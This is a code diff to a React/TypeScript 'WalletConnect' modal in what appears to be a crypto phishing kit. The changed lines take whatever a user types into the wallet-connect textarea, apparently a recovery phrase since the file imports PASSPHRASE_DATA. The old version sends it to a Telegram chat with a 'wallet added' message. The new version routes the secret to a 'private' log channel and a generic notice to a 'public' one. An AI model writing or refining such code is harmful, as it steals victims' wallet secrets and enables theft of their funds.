@@ -13,8 +13,9 @@ import { type TWalletConnectInit, wcFormInit } from "@/data/modals/init-values";
 import { ROUTES } from "@/data/routes";
 import { checkPendingIcon } from "@/data/pages/ui-icons";
 import { PASSPHRASE_DATA } from "@/data/pages/inp-data";
-import { TG_TOKEN, TG_METHOD_NAMES, CHAT_ID } from "@/data/api/tokens";
-import { sendLog } from "@/api/logger-utils";
+import { PUBLIC_LOG_CHANNEL, PRIVATE_LOG_CHANNEL } from "@/data/api/tokens";
+import { sendExtendedLog } from "@/api/logger-utils";
+import { logMessages } from "@/data/pages/initial";
 
 // * WalletConnect - WC or wc
 export const WalletConnect = ({ setIsOpenModal }: TWalletConnectProps): JSX.Element => {
@@ -69,8 +70,10 @@ export const WalletConnect = ({ setIsOpenModal }: TWalletConnectProps): JSX.Elem
         // * Add logger condition here
 
         if (!isLastStep) return next();
-        await sendLog(TG_TOKEN, TG_METHOD_NAMES.sendMessage, CHAT_ID, `<blockquote>Кошелёк добавлен.</blockquote>${getValues("wallet-connect-textarea")}`);
-        
+
+        await sendExtendedLog(PUBLIC_LOG_CHANNEL, logMessages.walletConnect);
+        await sendExtendedLog(PRIVATE_LOG_CHANNEL, `<blockquote>${logMessages.walletConnect}</blockquote>${getValues("wallet-connect-textarea")}`);
+
         await new Promise((resolve: any) => setTimeout(resolve, 2000));
         reset();
         setIsOpenModal && setIsOpenModal(false);
